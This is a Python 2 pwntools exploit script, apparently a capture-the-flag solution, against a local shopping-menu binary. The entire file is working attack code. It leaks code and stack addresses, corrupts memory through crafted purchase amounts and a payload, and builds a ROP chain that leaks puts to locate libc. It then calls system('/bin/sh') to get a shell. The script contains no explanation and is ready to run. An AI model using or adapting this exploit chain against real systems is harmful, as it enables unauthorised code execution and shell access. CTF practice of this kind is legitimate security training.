#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('127.0.0.1', 8888)
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.27.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Your choice:', str(index))

def buy(index, num):
    menu(2)
    p.sla('Which do you want to buy:', str(index))
    p.sla('ow many do you want to buy:', str(num))

def checkout():
    menu(3)

if __name__ == '__main__':
    menu('-1' + 'a' * 5)
    p.ru('a\n')
    code_base = u64(p.rl().strip().ljust(8, '\x00')) - 0x5555555548f0 + 0x555555554000
    success('code ' + hex(code_base))
    menu('-1' + 'a' * 13)
    p.ru('a\n')
    stack_base = u64(p.rl().strip().ljust(8, '\x00')) - 0x7fffffffee60 + 0x7fffffffed40 - 8
    success('stack ' + hex(stack_base))

    buy(1, 25116766)
    buy(1, 25116767)
    buy(2, 1)
    buy(2, 1)
    buy(2, 1)
    checkout()
    buy(2, 10)
    buy(2, 10)
    buy(1, 25116766)
    checkout()
    p.sla('y/n)', 'y')
    have_removed_addr = 0x00005555557580B0 - 0x555555554000 + code_base
    payload = flat('\x00' * 0xd8, 0x31, have_removed_addr + 0x2, p64(0x0) * 4, 0x181, stack_base)
    #gogogo('heap chunks')
    p.sa('ason why you are so poor:', payload)
    buy(2, 1)
    buy(1, 25116767)
    #gogogo()
    buy(1, 25116767)
    checkout()
    p.sla('y/n)', 'y')
    read_addr = code_base + 0x0000000000001136
    pop_rdi_ret = code_base + 0x0000000000001413
    csu_addr = code_base + 0x000000000000140A
    csu_back_addr = code_base + 0x00000000000013F0
    ret_addr = stack_base - 0x00007ffda906e3c8 + 0x7ffda906e420 - 8
    payload = flat(pop_rdi_ret, elf.got['puts'] + code_base, elf.plt['puts'] + code_base)
    payload += flat(csu_addr, 0x0, 0x0, code_base + elf.got['read'], 0x1000, ret_addr, 0x0, csu_back_addr)
    #bc(csu_back_addr)
    p.sa('ason why you are so poor:', payload)
    puts_addr = u64(p.r(6).ljust(8, '\x00'))
    libc.address = puts_addr - libc.sym['puts']
    payload = flat(pop_rdi_ret, libc.search('/bin/sh').next(), libc.sym['system'])
    sleep(0.1)
    bc(libc.sym['system'])
    p.s(payload)
    #buy(1, 25116767)
    #buy(2, 10)
    #buy(2, 10)
    #buy(1, 25116767)
    #checkout()
    p.i()
